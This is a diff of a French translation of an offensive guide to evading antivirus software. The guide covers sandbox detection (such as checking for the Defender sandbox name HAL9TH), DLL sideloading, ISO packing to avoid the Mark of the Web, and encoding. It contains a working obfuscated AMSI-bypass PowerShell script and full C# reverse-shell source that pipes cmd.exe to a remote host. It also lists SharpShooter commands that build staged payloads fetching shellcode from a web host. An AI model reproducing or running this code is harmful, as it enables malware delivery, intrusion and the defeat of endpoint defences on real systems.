@@ -28,7 +28,7 @@ Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votr
 
 * **Obscurcissement**
 
-Parfois, tout ce que vous avez à faire est de changer quelques chaînes dans votre binaire ou votre script pour le faire passer devant l'AV, mais cela peut être une tâche fastidieuse en fonction de ce que vous essayez d'obscurcir.
+Parfois, il suffit de changer quelques chaînes dans votre binaire ou script pour le faire passer devant l'AV, mais cela peut être une tâche chronophage en fonction de ce que vous essayez d'obscurcir.
 
 * **Outils personnalisés**
 
@@ -46,9 +46,9 @@ L'analyse dynamique consiste à exécuter votre binaire dans un bac à sable et 
 
 * **Dormir avant l'exécution** Selon la façon dont il est implémenté, cela peut être un excellent moyen de contourner l'analyse dynamique de l'AV. Les AV ont très peu de temps pour scanner les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc l'utilisation de longues pauses peut perturber l'analyse des binaires. Le problème est que de nombreux bac à sable AV peuvent simplement sauter la pause en fonction de la façon dont elle est implémentée.
 * **Vérification des ressources de la machine** Les bac à sable ont généralement très peu de ressources à utiliser (par exemple, < 2 Go de RAM), sinon ils pourraient ralentir la machine de l'utilisateur. Vous pouvez également être très créatif ici, par exemple en vérifiant la température du CPU ou même les vitesses du ventilateur, tout ne sera pas implémenté dans le bac à sable.
-* **Vérifications spécifiques à la machine** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, s'il ne le fait pas, vous pouvez faire sortir votre programme.
+* **Vérifications spécifiques à la machine** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, s'il ne correspond pas, vous pouvez faire sortir votre programme.
 
-Il s'avère que le nom d'ordinateur Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du bac à sable de Defender, vous pouvez donc faire sortir votre programme.
+Il s'avère que le nom d'ordinateur du bac à sable de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du bac à sable de Defender, vous pouvez donc faire sortir votre programme.
 
 <figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -60,14 +60,32 @@ Comme nous l'avons dit précédemment dans ce post, les **outils publics** seron
 
 Par exemple, si vous voulez vider LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui vide également LSASS.
 
-La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un, sinon le malware le plus signalé par les AV et les EDR, alors que le projet lui-même est super cool, c'est aussi un cauchemar pour travailler avec lui pour contourner les AV, alors cherchez simplement des alternatives pour ce que vous essayez d'atteindre.
+La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un, sinon le malware le plus signalé par les AV et les EDR, alors que le projet lui-même est super cool, c'est aussi un cauchemar pour travailler avec lui pour contourner les AV, donc cherchez simplement des alternatives pour ce que vous essayez d'accomplir.
 
 {% hint style="info" %}
-Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS TÉLÉCHARGER SUR VIRUSTOTAL** si votre
+Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS TÉLÉCHARGER SUR VIRUSTOTAL** si votre objectif est d'atteindre l'évasion à long terme. Si vous voulez vérifier si votre charge utile est détectée par un AV particulier, installez-le sur une VM, essayez de désactiver la soumission automatique d'échantillons et testez-le là-bas jusqu'à ce que vous soyez satisfait du résultat.
+{% endhint %}
+## EXEs vs DLLs
+
+Chaque fois que c'est possible, **priorisez l'utilisation de DLL pour l'évasion**, dans mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, donc c'est un truc très simple à utiliser pour éviter la détection dans certains cas (si votre charge utile a un moyen de s'exécuter en tant que DLL bien sûr).
+
+Comme nous pouvons le voir sur cette image, une charge utile DLL de Havoc a un taux de détection de 4/26 dans antiscan.me, tandis que la charge utile EXE a un taux de détection de 7/26.
+
+<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>Comparaison de antiscan.me d'une charge utile Havoc EXE normale par rapport à une charge utile Havoc DLL normale</p></figcaption></figure>
+
+Maintenant, nous allons montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus discret.
+
+## DLL Sideloading & Proxying
+
+**Le DLL Sideloading** profite de l'ordre de recherche de DLL utilisé par le chargeur en positionnant à la fois l'application victime et les charges utiles malveillantes côte à côte.
+
+Vous pouvez vérifier les programmes susceptibles de DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant:
+
+{% code overflow="wrap" %}
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
-    $binarytoCheck = "C:\Program Files\" + $_
-    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
+$binarytoCheck = "C:\Program Files\" + $_
+C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
 {% endcode %}
@@ -177,18 +195,18 @@ Tout ce qu'il a fallu, c'est une ligne de code PowerShell pour rendre AMSI inuti
 Voici une technique de contournement AMSI modifiée que j'ai prise de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```powershell
 Try{#Ams1 bypass technic nº 2
-      $Xdatabase = 'Utils';$Homedrive = 'si'
-      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
-      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
-      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
-      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
-      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
-      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
-      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
-      $Spotfix.SetValue($null,$true)
-   }Catch{Throw $_}
+$Xdatabase = 'Utils';$Homedrive = 'si'
+$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
+$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
+$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
+$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
+$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
+$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
+$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
+$Spotfix.SetValue($null,$true)
+}Catch{Throw $_}
 ```
-Gardez à l'esprit que cela sera probablement signalé une fois que ce post sera publié, donc vous ne devriez pas publier de code si votre plan est de rester indétecté.
+Gardez à l'esprit que cela sera probablement signalé une fois que ce post sera publié, donc vous ne devriez pas publier de code si votre plan est de rester indétectable.
 
 **Patching de mémoire**
 
@@ -234,7 +252,7 @@ Il est important de noter que les exécutables signés avec un certificat de sig
 
 Un moyen très efficace d'empêcher vos charges utiles d'obtenir la marque du Web est de les emballer dans une sorte de conteneur comme un ISO. Cela se produit parce que la marque du Web (MOTW) **ne peut pas** être appliquée aux volumes **non NTFS**.
 
-<figure><img src="../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe les charges utiles dans des conteneurs de sortie pour éviter la marque du Web.
 
@@ -243,20 +261,20 @@ Exemple d'utilisation :
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
-    +             o     +           +             o     +         +
-    o  +           +        +           o  +           +          o
++             o     +           +             o     +         +
+o  +           +        +           o  +           +          o
 -_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
-   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
-   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
+:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
+for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
 -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
 +      o         o   +       o       +      o         o   +       o
 +      o            +      o    ~   Mariusz Banach / mgeeky    o
 o      ~     +           ~          <mb [at] binary-offensive.com>
-    o           +                         o           +           +
+o           +                         o           +           +
 
 [.] Packaging input file to output .iso (iso)...
 Burning file onto ISO:
-    Adding file: /TotallyLegitApp.exe
+Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
@@ -274,7 +292,7 @@ La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc,
 
 * **Fork\&Run**
 
-Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela présente à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus d'implant de Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation se passe mal ou est détecté, il y a une **beaucoup plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande chance** de vous faire prendre par les **détections comportementales**.
+Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela présente à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus d'implant de Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation se passe mal ou est détecté, il y a une **beaucoup plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande chance** de vous faire prendre par des **détections comportementales**.
 
 <figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -363,27 +381,23 @@ cd ..
 ```
 # Contournement des antivirus
 
-Lorsque vous effectuez un test de pénétration, il est important de savoir comment contourner les antivirus pour pouvoir exécuter des charges utiles sur la machine cible. Dans cette section, nous allons examiner quelques techniques courantes pour contourner les antivirus.
+Lors de la création d'un payload, il est important de s'assurer qu'il ne sera pas détecté par les antivirus. Les antivirus utilisent des signatures pour détecter les malwares, il est donc important de modifier le payload pour qu'il ne corresponde pas à ces signatures.
 
 ## Encodage
 
-L'encodage est une technique courante pour contourner les antivirus. L'idée est de prendre une charge utile existante et de l'encoder de manière à ce qu'elle ne soit pas détectée par l'antivirus. Il existe de nombreux outils d'encodage disponibles, tels que `msfvenom`, qui peuvent être utilisés pour encoder des charges utiles.
+L'encodage est une technique courante pour contourner les antivirus. Il s'agit de modifier le payload en utilisant un algorithme d'encodage pour qu'il ne corresponde plus à la signature de l'antivirus. Il existe de nombreux outils pour encoder des payloads, tels que `msfvenom` et `Veil-Evasion`.
 
-## FUD (Fully Undetectable)
+## FUD
 
-Le FUD (Fully Undetectable) est un terme utilisé pour décrire une charge utile qui n'est pas détectée par les antivirus. Pour atteindre cet objectif, il est souvent nécessaire d'utiliser des techniques d'encodage avancées et de modifier la charge utile pour qu'elle ne corresponde pas à une signature connue de l'antivirus.
-
-## Injection de code
-
-L'injection de code est une technique courante pour contourner les antivirus. L'idée est d'injecter du code dans un processus légitime en cours d'exécution sur la machine cible. Cette technique peut être utilisée pour exécuter une charge utile sans déclencher l'alerte de l'antivirus.
+FUD signifie "Fully Undetectable" (complètement indétectable). Il s'agit d'un état dans lequel le payload ne peut pas être détecté par les antivirus. Pour atteindre cet état, il est nécessaire de modifier le payload de manière à ce qu'il ne corresponde à aucune signature d'antivirus connue. Cela peut être réalisé en utilisant des techniques d'encodage, de cryptage et de polymorphisme.
 
 ## Polymorphisme
 
-Le polymorphisme est une technique avancée pour contourner les antivirus. L'idée est de modifier la charge utile à chaque exécution de manière à ce qu'elle ne corresponde pas à une signature connue de l'antivirus. Cette technique nécessite une connaissance approfondie de la structure interne de l'antivirus et est souvent utilisée par des attaquants expérimentés.
+Le polymorphisme est une technique qui consiste à modifier le code du payload à chaque exécution, de sorte qu'il ne corresponde pas à la signature de l'antivirus. Cette technique est très efficace pour contourner les antivirus, car elle rend le payload unique à chaque exécution.
 
 ## Conclusion
 
-Contourner les antivirus est un élément clé de tout test de pénétration réussi. En utilisant les techniques décrites dans cette section, vous devriez être en mesure de contourner la plupart des antivirus et d'exécuter des charges utiles sur la machine cible.
+Le contournement des antivirus est un aspect important de la création de payloads. Les techniques d'encodage, de FUD et de polymorphisme sont toutes efficaces pour atteindre cet objectif. Il est important de tester le payload avec plusieurs antivirus pour s'assurer qu'il est indétectable avant de l'utiliser dans une attaque.
 ```
 use 1
 list #Listing available payloads
@@ -427,62 +441,62 @@ using System.Net.Sockets;
 
 namespace ConnectBack
 {
-	public class Program
-	{
-		static StreamWriter streamWriter;
+public class Program
+{
+static StreamWriter streamWriter;
 
-		public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+public static void Main(string[] args)
+{
+using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
+{
+using(Stream stream = client.GetStream())
+{
+using(StreamReader rdr = new StreamReader(stream))
+{
+streamWriter = new StreamWriter(stream);
 
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+StringBuilder strInput = new StringBuilder();
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
-		}
+Process p = new Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.CreateNoWindow = true;
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.StartInfo.RedirectStandardInput = true;
+p.StartInfo.RedirectStandardError = true;
+p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+p.Start();
+p.BeginOutputReadLine();
 
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            StringBuilder strOutput = new StringBuilder();
+while(true)
+{
+strInput.Append(rdr.ReadLine());
+//strInput.Append("\n");
+p.StandardInput.WriteLine(strInput);
+strInput.Remove(0, strInput.Length);
+}
+}
+}
+}
+}
 
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
-            }
-        }
+private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+{
+StringBuilder strOutput = new StringBuilder();
 
-	}
+if (!String.IsNullOrEmpty(outLine.Data))
+{
+try
+{
+strOutput.Append(outLine.Data);
+streamWriter.WriteLine(strOutput);
+streamWriter.Flush();
+}
+catch (Exception err) { }
+}
+}
+
+}
 }
 ```
 [https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
@@ -531,16 +545,16 @@ https://www.shellterproject.com/download/
 
 # Sharpshooter
 # https://github.com/mdsecactivebreach/SharpShooter
-# Javascript Payload Stageless: 
+# Javascript Payload Stageless:
 SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
 
-# Stageless HTA Payload: 
+# Stageless HTA Payload:
 SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
 
 # Staged VBS:
 SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
 
-# Donut: 
+# Donut:
 https://github.com/TheWover/donut
 
 # Vulcan
